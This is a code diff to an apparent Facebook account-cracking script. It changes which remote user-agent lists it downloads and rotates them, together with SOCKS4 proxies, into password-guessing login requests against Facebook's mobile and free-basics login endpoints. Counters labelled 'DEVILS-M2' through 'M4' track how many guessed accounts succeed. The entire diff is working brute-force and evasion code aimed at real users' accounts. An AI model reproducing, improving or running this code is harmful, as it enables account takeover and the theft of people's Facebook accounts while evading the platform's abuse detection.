@@ -77,7 +77,7 @@ prox=open('.prox.txt','r').read().splitlines()
 
 #-----------------------ua---------------------------------
 try:
- proxo= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/ua2.txt').text
+ proxo= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/untitlevvbd.txt').text
  open('.proxo.txt','w').write(proxo)
 except Exception as e:
  print('')
@@ -85,12 +85,12 @@ proxo=open('.proxo.txt','r').read().splitlines()
 
 #-----------------------ua---------------------------------
 try:
- proxod= requests.get('https://raw.githubusercontent.com/FB-KING/KING-PRO/main/ua.txt').text
- open('.proxod.txt','w').write(proxo)
+ prd= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/file-ua.txt').text
+ open('.prd.txt','w').write(prd)
 except Exception as e:
  print('')
-proxod=open('.proxod.txt','r').read().splitlines()
-
+prd=open('.prd.txt','r').read().splitlines()
+print(prd)
 #-----userid-separate----#
 def user_id(coki):
     c_user_index = coki.find('c_user=')
@@ -477,6 +477,7 @@ class main_crack():
             #sys.stdout.write(f"\r{S}[DEVILS-M1] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             ua_string=random.choice(ugen)
+            ua89=random.choice(prd)
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -511,11 +512,11 @@ class main_crack():
                  'x-fb-sim-hni': '38531',
                  'x-fb-net-hni': '20691',
                  'x-fb-connection-quality': 'EXCELLENT',
-                 'user-agent': __UBI___(),
+                 'user-agent': ua89,
                  'content-type': 'application/x-www-form-urlencoded', 
                  'x-fb-http-engine': 'Liger'}
+                print(data)
                 print(headers)
-                #print(headers)
                 #Elite(__UBI___,sid,ps,cookie)
                 #fike(__UBI___,sid,ps)
                 rakib(sid,ps)
@@ -1126,6 +1127,7 @@ def ram2(fid,pwx,tl):
             session = requests.Session()
             sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
             sys.stdout.flush()
+            uax=random.choice(proxo)
             ua = random.choice(ugen)
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
@@ -1156,7 +1158,7 @@ def ram2(fid,pwx,tl):
             'referer': 'https://p.facebook.com/',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
-            'user-agent': ua}
+            'user-agent': uax}
             lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
@@ -1198,6 +1200,7 @@ def ram3(fid,pwx,tl):
             session = requests.Session()
             sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
             sys.stdout.flush()
+            uax=random.choice(proxo)
             ua = random.choice(ugen)
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
@@ -1242,7 +1245,7 @@ def ram3(fid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': ua}
+            'user-agent': uax}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
@@ -1284,6 +1287,7 @@ def ram4(fid,pwx,tl):
             session = requests.Session()
             sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M4\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
             sys.stdout.flush()
+            uax=random.choice(proxo)
             ua = random.choice(ugen)
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
@@ -1319,7 +1323,7 @@ def ram4(fid,pwx,tl):
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
-            'user-agent': ua}
+            'user-agent': uax}
             lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
